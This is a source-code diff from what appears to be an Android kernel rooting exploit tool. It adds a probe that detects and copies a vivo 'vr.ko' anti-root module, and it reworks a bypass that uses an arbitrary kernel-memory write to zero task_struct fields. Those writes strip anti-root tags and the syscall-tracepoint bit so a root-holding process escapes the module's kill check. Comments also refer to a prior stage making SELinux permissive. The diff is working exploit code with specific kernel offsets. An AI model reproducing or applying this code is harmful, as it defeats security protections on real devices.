@@ -28,16 +28,222 @@
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
 
+#include <fcntl.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
 #include <array>
+#include <climits>
 #include <cstdint>
+#include <cstdio>
 #include <optional>
+#include <string>
 #include <string_view>
 #include <utility>
 
 namespace ghostlock::session::backend {
     namespace {
+        /* One /proc/modules probe result. The name is kept (the old boolean
+         * could not tell "read and matched" from "unreadable, assumed loaded"),
+         * because the diagnostic copy below needs the file name. */
+        struct VrProbe {
+            int32_t needed = 1;
+            int32_t readable = 0;
+            char name[64] = {};
+        };
+
+        VrProbe probe_vr_module() {
+            VrProbe result;
+            result.needed = 1; /* /proc/modules unreadable: assume loaded */
+            FILE *m = fopen("/proc/modules", "r");
+            if (m == nullptr) return result;
+            auto close_modules = ghostlock::support::make_scope_exit(
+                [m]() noexcept { fclose(m); });
+            result.readable = 1;
+            result.needed = 0;
+            std::array<char, 256> mod{};
+            while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
+                const std::string_view line(mod.data());
+                const bool vr_prefix =
+                        line.size() >= 2 &&
+                        (line[0] == 'v' || line[0] == 'V') &&
+                        (line[1] == 'r' || line[1] == 'R');
+                if (!(vr_prefix && line.size() > 2 &&
+                      (line[2] == ' ' || line[2] == '_'))) {
+                    continue;
+                }
+                result.needed = 1;
+                /* The name becomes a path component: keep [A-Za-z0-9_-] only. */
+                size_t kept = 0;
+                for (size_t i = 0; i < line.size() && kept + 1 < sizeof(result.name); i++) {
+                    const char c = line[i];
+                    if (c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
+                    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+                        (c >= '0' && c <= '9') || c == '_' || c == '-') {
+                        result.name[kept++] = c;
+                    }
+                }
+                result.name[kept] = '\0';
+                break;
+            }
+            return result;
+        }
+
+        /* Copy the loaded module's file and a small manifest into the app's run
+         * folder, which the exporter zips whole. Best effort by design: every
+         * failure is logged and recorded in the manifest, never fatal. The read
+         * runs at W2, after W1 made SELinux permissive, so a 0644 vendor file
+         * is readable without root; an unreadable file is a manifest entry, not
+         * a stopped run. */
+        void capture_vr_module(const VrProbe &probe, const std::string &run_dir) {
+            if (run_dir.empty()) return;
+            const std::string manifest_path = run_dir + "/vr-module.txt";
+            FILE *manifest = fopen(manifest_path.c_str(), "w");
+            if (manifest != nullptr) {
+                fprintf(manifest, "module=%s\n", probe.name);
+                fprintf(manifest, "probe_readable=%d\n", probe.readable);
+                fprintf(manifest, "probe_needed=%d\n", probe.needed);
+            }
+            if (!probe.name[0]) {
+                if (manifest != nullptr) fprintf(manifest, "result=no-name\n");
+                if (manifest != nullptr) fclose(manifest);
+                return;
+            }
+            static const char *const dirs[] = {
+                "/vendor/lib/modules", "/vendor_dlkm/lib/modules",
+                "/lib/modules", "/system/lib/modules",
+            };
+            static const char *const suffixes[] = {".ko", ".ko.xz", ".ko.gz", ".ko.zst"};
+            /* /proc/modules spells '-' as '_'; vendor files sometimes keep the
+             * hyphen, so try both spellings. */
+            char alt[sizeof(probe.name)] = {};
+            snprintf(alt, sizeof(alt), "%s", probe.name);
+            for (size_t i = 0; alt[i] != '\0'; i++) {
+                if (alt[i] == '_') alt[i] = '-';
+            }
+            const char *const names[] = {probe.name, alt};
+
+            constexpr long long kMaxBytes = 16LL * 1024 * 1024;
+            char source[PATH_MAX] = {};
+            const char *suffix = nullptr;
+            int32_t fd = -1;
+            for (const char *dir : dirs) {
+                for (const char *name : names) {
+                    for (const char *candidate_suffix : suffixes) {
+                        char path[PATH_MAX];
+                        const int n = snprintf(path, sizeof(path), "%s/%s%s", dir, name,
+                                               candidate_suffix);
+                        if (n <= 0 || static_cast<size_t>(n) >= sizeof(path)) continue;
+                        /* Symlinks are allowed: /vendor/lib/modules is
+                         * sometimes a link into /vendor_dlkm, and the name is
+                         * kernel-supplied and sanitised above. */
+                        fd = open(path, O_RDONLY | O_CLOEXEC);
+                        if (fd < 0) continue;
+                        snprintf(source, sizeof(source), "%s", path);
+                        suffix = candidate_suffix;
+                        break;
+                    }
+                    if (fd >= 0) break;
+                }
+                if (fd >= 0) break;
+            }
+            if (fd < 0) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "result=not-found\n");
+                    fprintf(manifest, "dirs=/vendor/lib/modules,/vendor_dlkm/lib/modules,"
+                                      "/lib/modules,/system/lib/modules\n");
+                    fprintf(manifest, "suffixes=.ko,.ko.xz,.ko.gz,.ko.zst\n");
+                    fclose(manifest);
+                }
+                pr_info("vr.ko module: %s not found in the vendor module dirs\n", probe.name);
+                return;
+            }
+            struct stat st{};
+            if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size <= 0 ||
+                static_cast<long long>(st.st_size) > kMaxBytes) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\n", source);
+                    fprintf(manifest, "bytes=%lld\n", static_cast<long long>(st.st_size));
+                    fprintf(manifest, "result=rejected-size-or-type\n");
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: %s rejected (bytes=%lld)\n", source,
+                           static_cast<long long>(st.st_size));
+                close(fd);
+                return;
+            }
+            char dst[PATH_MAX];
+            const int dst_len =
+                    snprintf(dst, sizeof(dst), "%s/vr-module%s", run_dir.c_str(), suffix);
+            if (dst_len <= 0 || static_cast<size_t>(dst_len) >= sizeof(dst)) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=dst-path-too-long\n", source);
+                    fclose(manifest);
+                }
+                close(fd);
+                pr_warning("vr.ko module: run folder path too long\n");
+                return;
+            }
+            const int32_t out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+            if (out < 0) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=open-dst-failed\n", source);
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: cannot create %s\n", dst);
+                close(fd);
+                return;
+            }
+            std::array<char, 65536> buffer{};
+            long long total = 0;
+            bool ok = true;
+            for (;;) {
+                const ssize_t got = read(fd, buffer.data(), buffer.size());
+                if (got < 0) {
+                    ok = false;
+                    break;
+                }
+                if (got == 0) break;
+                size_t off = 0;
+                while (off < static_cast<size_t>(got)) {
+                    const ssize_t put =
+                            write(out, buffer.data() + off, static_cast<size_t>(got) - off);
+                    if (put <= 0) {
+                        ok = false;
+                        break;
+                    }
+                    off += static_cast<size_t>(put);
+                }
+                if (!ok) break;
+                total += got;
+                if (total > kMaxBytes) {
+                    ok = false;
+                    break;
+                }
+            }
+            close(fd);
+            if (ok) (void) fsync(out);
+            close(out);
+            if (!ok) {
+                unlink(dst);
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=copy-failed\n", source);
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: copy from %s failed\n", source);
+                return;
+            }
+            if (manifest != nullptr) {
+                fprintf(manifest, "source=%s\n", source);
+                fprintf(manifest, "bytes=%lld\n", total);
+                fprintf(manifest, "result=ok\n");
+                fflush(manifest);
+                (void) fsync(fileno(manifest));
+                fclose(manifest);
+            }
+            pr_info("vr.ko module: copied %s (%lld bytes) -> %s\n", source, total, dst);
+        }
+
         /* Shared write/retry sequence. */
         template <class M>
         Status retry_write_stage(
@@ -164,54 +370,76 @@ namespace ghostlock::session::backend {
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
-         * Always compiled: the /proc/modules probe below decides at runtime
-         * whether the writes run. The tag-B offset is overridable at build time
-         * (profile/macros.h), not gated by a define.
+         * Only the 6.x vr.ko generation uses the per-task tags: a byte at
+         * task+0x06 (inside thread_info.flags) and one at task+0x2c. The 5.10
+         * generation has neither, and on a 5.10 Image task+0x28 is
+         * thread_info.scs_sp, so zeroing the aligned word panics a
+         * CONFIG_SHADOW_CALL_STACK kernel.
          *
-         * vr.ko tags every app-origin task at fork/clone time. When the task
-         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
-         * strip the tag BEFORE W2 verify runs the child's getuid().
+         * The UI choice is authoritative: Auto clears the tags only when the
+         * probe finds a vr module AND the profile is 6.x, On forces the writes
+         * (the 5.x direction is warned about and logged), Off never writes.
          *
          * This exploit primitive is 64-bit granular, so:
          *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
-         *     clears the syscall-tracepoint bit (0x400). This takes the task
-         *     off the sys_exit slow-path immediately.
-         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
-         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
-         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+         *     clears the syscall-tracepoint bit (0x400).
+         *   – tag B is at +0x2c; we align down to 0x28 and zero the word.
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
+                static VrProbe vr{};
+                static bool vr_probed = false;
+                if (!vr_probed) {
+                    vr = probe_vr_module();
+                    vr_probed = true;
+                    pr_info("vr.ko probe: /proc/modules readable=%d name=%s\n",
+                            vr.readable, vr.name[0] ? vr.name : "<none>");
+                    /* Before the tag writes: if the tag-B write is the thing that
+                     * kills this device, the module copy is already in the run
+                     * folder and the export carries it. */
+                    if (vr.needed) {
+                        capture_vr_module(vr, config::runtime_config_snapshot().run_dir);
                     }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
+                }
+
+                /* The user's tri-state choice decides. The version and probe
+                 * only feed the recommendation Auto resolves to; On/Off is
+                 * final, including the 5.x scs_sp direction and a run with no
+                 * module detected. Both are warned about and logged. */
+                const config::VrKoMode vr_mode =
+                        config::runtime_config_snapshot().vrko_tag_clear;
+                const uint8_t vr_kernel_major = g_exploit_session.profile.kernel_major();
+                const bool vr_version_ok = vr_kernel_major >= 6;
+                const bool vr_recommended = vr.needed && vr_version_ok;
+                bool vr_write_tags = false;
+                const char *vr_reason = "auto-no-module";
+                switch (vr_mode) {
+                    case config::VrKoMode::On:
+                        vr_write_tags = true;
+                        vr_reason = "user-on";
+                        break;
+                    case config::VrKoMode::Off:
+                        vr_reason = "user-off";
+                        break;
+                    case config::VrKoMode::Auto:
+                        vr_write_tags = vr_recommended;
+                        vr_reason = !vr.needed ? "auto-no-module"
+                                    : !vr_version_ok ? "auto-kernel-major"
+                                    : "auto-recommended";
+                        break;
+                }
+                pr_info("vr.ko tag clear: mode=%s recommended=%d effective=%d kernel_major=%u probe=%d reason=%s\n",
+                        config::vr_ko_mode_name(vr_mode), vr_recommended ? 1 : 0,
+                        vr_write_tags ? 1 : 0, static_cast<unsigned>(vr_kernel_major),
+                        vr.needed, vr_reason);
+                if (vr_write_tags && !vr_recommended) {
+                    pr_warning("vr.ko tag clear: user override forces the tag writes "
+                               "(recommended=0 kernel_major=%u probe=%d)\n",
+                               static_cast<unsigned>(vr_kernel_major), vr.needed);
                 }
 
                 int32_t vr_ok = 1;
-                if (vr_needed) {
+                if (vr_write_tags) {
                     /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
